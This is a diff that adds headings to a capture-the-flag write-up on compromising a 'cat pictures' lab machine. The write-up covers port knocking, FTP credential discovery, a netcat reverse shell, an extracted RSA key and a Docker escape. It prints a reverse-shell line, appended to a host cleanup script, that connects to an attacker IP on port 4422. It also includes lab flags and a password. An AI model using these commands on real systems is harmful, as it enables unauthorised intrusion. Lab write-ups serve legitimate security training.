@@ -1,4 +1,6 @@
-First of we did nmap/rust scan and here are the results
+## 1. Initial Reconnaissance
+
+First of all we did nmap/rust scan and here are the results
 
 ```sh
 └─$ nmap -sC -sV -T4 10.48.161.2
@@ -37,6 +39,8 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
+## 2. Web Application Enumeration
+
 Now Let's move toward the site there one user has posted something when we click on it we are greeted with a post of magic numbers
 
 ```js
@@ -52,6 +56,10 @@ POST ALL YOUR CAT PICTURES HERE :)
 
 Knock knock! Magic numbers: 1111, 2222, 3333, 4444
 ```
+
+## 3. Targeted Port Scanning
+
+### Probing the Magic Ports
 
 At first I thought maybe these numbers are some kind of cipher but given their count of digits and numbers I thought they seem to be port number so why not scan them
 Let's go and scan them using nmap
@@ -102,6 +110,10 @@ PORT     STATE  SERVICE
 4444/tcp closed krb524
 ```
 
+## 4. FTP Exploitation
+
+### Extracting the note.txt File
+
 okay now I think this was the part for scanning now let's check services
 first let's check FTP
 
@@ -134,6 +146,10 @@ Connect to port 4420, the password is sardinethecat.
 - catlover
 ```
 
+## 5. Gaining a Foothold
+
+### Reverse Shell via Internal Service
+
 Okieee let's go for 4420 now.
 
 From here I checked the installed software under /bin/ and found netcat to be installed. And that means we can use `nc` as a service for reverse shell :)
@@ -151,6 +167,8 @@ bash: no job control in this shell
 sardinethecat
 I have no name!@cat-pictures:/#
 ```
+
+## 6. Privilege Escalation
 
 Here there was one user in `/home` --> `catlover`
 the user has only one file named `runme`
@@ -206,6 +224,10 @@ O4fvFElowV6MXVEMY/04fdnSWavh0D+IkyGRcY5myFHyhWvmFcQ=
 
 We save the rsa file and change its permission to 600
 
+## 7. Container Access
+
+### Entering the Environment and Finding Flag 1
+
 And yeah we are in as root
 
 ```sh
@@ -246,6 +268,10 @@ root@7546fa2336d6:/root# cat flag.txt
 7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9
 ```
 
+## 8. Docker Escape
+
+### Identifying the Container Environment
+
 <h3> Okay Guys being a root was a big false positive :`( we are not root we are in a docker container :)</h3>
 You can see there is a docker file
 
@@ -253,6 +279,10 @@ You can see there is a docker file
 -rw-------   1 root root  588 Jun  4  2021 .bash_history
 -rwxr-xr-x   1 root root    0 Mar 25  2021 .dockerenv
 ```
+
+## 9. Host Level Exploitation
+
+### Injecting Malicious Code into clean.sh
 
 There is this file which is removing everything from /tmp
 
@@ -270,6 +300,10 @@ I placed this in the file
 ```sh
 echo '0<&196;exec 196<>/dev/tcp/<YOUR_IP>/4422; sh <&196 >&196 2>&196' >> clean.sh
 ```
+
+## 10. Final System Compromise
+
+### Achieving Host Root and Flag 2
 
 Okay now we wail till we get the shell
 ...
@@ -300,6 +334,10 @@ Here is your flag:
 4a98e43d78bab283938a06f38d2ca3a3c53f0476
 root@cat-pictures:~#
 ```
+
+## 11. Final Capture Summary
+
+### Collected Flags
 
 Thus we got both the flags as
 
